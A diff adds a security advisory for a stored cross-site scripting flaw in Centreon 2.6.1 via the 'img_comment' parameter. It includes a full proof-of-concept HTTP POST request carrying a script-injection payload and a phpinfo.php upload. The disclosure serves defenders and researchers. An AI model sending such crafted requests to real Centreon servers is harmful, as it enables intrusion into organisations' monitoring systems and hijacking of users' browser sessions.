@@ -1,0 +1,88 @@
+
+Centreon 2.6.1 Stored Cross-Site Scripting Vulnerability
+
+
+Vendor: Centreon
+Product web page: https://www.centreon.com
+Affected version: 2.6.1 (CES 3.2)
+
+Summary: Centreon is the choice of some of the world's largest
+companies and mission-critical organizations for real-time IT
+performance monitoring and diagnostics management.
+
+Desc: Centreon suffers from a stored XSS vulnerability. Input
+passed thru the POST parameter 'img_comment' is not sanitized
+allowing the attacker to execute HTML code into user's browser
+session on the affected site.
+
+Tested on: CentOS 6.6 (Final)
+           Apache/2.2.15
+           PHP/5.3.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5266
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5266.php
+
+
+10.08.2015
+
+--
+
+
+POST /centreon/main.php?p=50102 HTTP/1.1
+Host: localhost.localdomain
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost.localdomain/centreon/main.php?p=50102&o=a
+Cookie: PHPSESSID=qg580onenijim611sca8or3o32
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------951909060822176775828135993
+Content-Length: 1195
+
+
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="directories"
+
+upload
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="list_dir"
+
+0
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="filename"; filename="phpinfo.php"
+Content-Type: application/octet-stream
+
+<?
+phpinfo();
+?>
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="img_comment"
+
+"><script>alert(1);</script>
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="action[action]"
+
+1
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="submitA"
+
+Save
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+2097152
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="img_id"
+
+
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="o"
+
+a
+-----------------------------951909060822176775828135993--
